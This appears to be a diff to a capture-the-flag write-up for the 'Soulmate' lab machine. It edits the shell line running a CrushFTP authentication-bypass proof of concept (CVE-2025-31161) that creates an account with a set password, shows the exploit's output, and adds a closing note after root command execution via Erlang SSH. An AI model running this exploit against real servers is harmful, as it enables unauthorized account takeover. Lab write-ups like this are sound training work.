@@ -81,7 +81,7 @@ Searching for vulnerabilities in "CrushFTP" revealed a recent authentication byp
 The Python PoC script was used to create a new user named `z0n` with the password `admin123`.
 
 ```
-(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] /home/kali/soulmate/CVE-2025-31161 (main) ❯ python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user z0n --password admin123
+(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user z0n --password admin123
 [+] Exploit Complete you can now login with
 [*] Username: z0n
 [*] Password: admin123
@@ -183,3 +183,5 @@ With the `os` module available, it was possible to execute arbitrary shell comma
 ![Root_Flag](Pictures/htb_soulmate_Root_flag.png)
 
 The output returned **`root`**, indicating that the Erlang SSH service was running with `root` privileges. This allowed for full control over the system as `root` and the capture of the final flag.
+
+**Pwned! Soulmate**
